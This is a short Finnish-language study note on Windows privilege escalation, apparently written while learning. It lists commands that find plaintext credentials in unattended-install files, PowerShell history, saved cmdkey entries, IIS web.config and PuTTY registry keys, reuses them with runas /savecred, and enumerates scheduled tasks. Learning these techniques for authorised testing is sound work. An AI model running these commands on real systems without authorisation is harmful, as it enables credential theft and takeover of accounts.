## Privilege Escalation: Windows ##

Windowsissa tavalliset käyttäjät kuuluvat Users -käyttäjäryhmään, administraattorit Administrators -käyttäjäryhmään.

Erityiskäyttäjätunnukset:

SYSTEM / LocalSystem: Käyttöjärjestelmän käyttämä tunnus käyttöjärjestelmän sisäisiin toimintoihin. Adminejakin korkeammat oikeudet.

Local Service: Oletuskäyttäjä "minimioikeuksilla" Windowsin palvelujen ajamiseen, anonyymit yhteydet verkon yli.

Network Service: Sama kuin yllä, mutta käyttää tietokoneen tunnuksia autentikoitumiseen verkon yli.

**Selkokielisten tunnusten etsimispaikkoja**

WDS:llä asennetut "Unattended Windows Installations" saattavat jättää admin-tunnuksia näihin sijainteihin:
```bash
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Powershell-historia (cmd.exe ajettuna):
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Tallennetut käyttäjätunnukset:
```cmd
cmdkey /list
```
Jos löytyy kokeilemisen arvoisia, niin:
```cmd
runas /savecred /user:USERNAME cmd.exe
```
IIS konfiguraatioon tallennetut tunnukset:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
PuTTY:n tallentamat Proxy-tunnukset:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
**Ajastetut tehtävät**
Listaa ajastetut tehtävät:
```cmd
schtasks
```
Lisätietoja yksittäisestä tehtävästä:
```cmd
schtasks /query /tn *TaskName* /fo list /v
```
